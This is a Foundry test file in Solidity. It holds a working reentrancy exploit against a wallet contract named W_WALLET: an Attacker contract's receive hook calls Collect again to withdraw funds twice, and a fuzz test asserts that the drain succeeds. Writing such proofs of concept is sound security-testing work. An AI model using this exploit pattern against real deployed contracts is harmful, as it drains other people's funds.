
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {W_WALLET, Log} from "../src/W_WALLET.sol";

contract TestReentrancyW_WALLET is Test {
    W_WALLET public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new W_WALLET(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        // MinSum is 1 ether, so attackVal must be at least 1 ether
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The attacker needs to have a balance in the contract first
        // and the unlockTime must have passed

        // --- 3. Funding ---
        // Fund the victim contract with enough ETH to be drained
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the attacker contract
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the test contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        // Setup: Attacker deposits funds and sets up for the attack
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // Warp time to pass the unlock time
        vm.warp(block.timestamp + 1);
        
        // Execute the attack
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    W_WALLET public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = W_WALLET(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit funds into the victim contract to establish a balance
        // This sets unlockTime to current block.timestamp (since 0 < block.timestamp)
        victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State - balance before attack
        initialSnapshot = address(this).balance;
        
        // 2. Store the value for the re-entrant call
        storedAttackVal = val;
        attackCallCount = 0;

        // 3. Call the vulnerable function
        victim.Collect(val);

        // 4. Verify Success Conditions
        // If we received more than what we deposited (due to reentrancy draining extra funds),
        // or if we were called back multiple times, the exploit succeeded
        uint256 finalBalance = address(this).balance;
        uint256 gained = finalBalance - initialSnapshot;
        
        // The exploit is successful if we gained more than the single withdrawal amount
        // (meaning we withdrew multiple times due to reentrancy)
        if (gained > val || attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        
        // Re-enter if this is the first callback and victim still has funds
        if (attackCallCount < 2 && address(victim).balance >= storedAttackVal) {
            // Re-enter the Collect function before state is updated
            victim.Collect(storedAttackVal);
        }
    }

    fallback() external payable {}
}
